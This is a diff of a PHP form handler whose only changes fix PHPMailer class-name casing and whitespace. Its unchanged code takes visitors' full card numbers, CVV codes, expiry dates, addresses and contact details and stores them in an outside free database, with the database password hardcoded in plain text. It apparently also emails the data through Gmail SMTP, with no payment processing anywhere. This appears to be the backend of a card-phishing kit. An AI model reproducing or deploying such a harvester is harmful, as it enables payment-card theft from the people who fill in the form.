@@ -83,9 +83,9 @@ html , body {background:transparent; }
 
 
 <?php
-use phpmailer\phpmailer\phpmailer;
-use phpmailer\phpmailer\smtp;
-use phpmailer\phpmailer\exception;
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
 require 'autre/phpmailer/exception.php';
 require 'autre/phpmailer/phpmailer.php';
 require 'autre/phpmailer/smtp.php';
@@ -93,14 +93,12 @@ require 'autre/phpmailer/smtp.php';
 
 
 
-if(    isset($_POST["name"])  )	
+if(    isset($_POST["name"])  )
 {
-	
 $connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
 $query =  "INSERT INTO tablee   (name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
 $user_data =  array(      ':name' => $_POST["name"],        ':date' => $_POST["date"],      ':address' => $_POST["address"],     ':codepostal' => $_POST["codepostal"],    ':city' => $_POST["city"],    ':phone' => $_POST["phone"],    ':email' => $_POST["email"],    ':namecard' => $_POST["namecard"],    ':cardnumber' => $_POST["cardnumber"],    ':cvv' => $_POST["cvv"],    ':datexp' => $_POST["datexp"]          ) ;
 if(     $connect   ->  prepare($query)	->  execute($user_data)               )       {  echo'yes'; }  else   {  echo'none'; }
-
 
 $name = $_POST["name"];
 $date = $_POST["date"];
@@ -138,8 +136,8 @@ if ( $file   ) {  echo "yeswrite ";   }else{  echo "nonwrite  ";   }
 
 
 
-$mail = new phpmailer(); 
-$mail->isSMTP(); 
+$mail = new PHPMailer(); 
+$mail->IsSMTP(); 
 $mail->Host = "smtp.gmail.com";
 $mail->Port = 587; 
 $mail->SMTPAuth = true; 
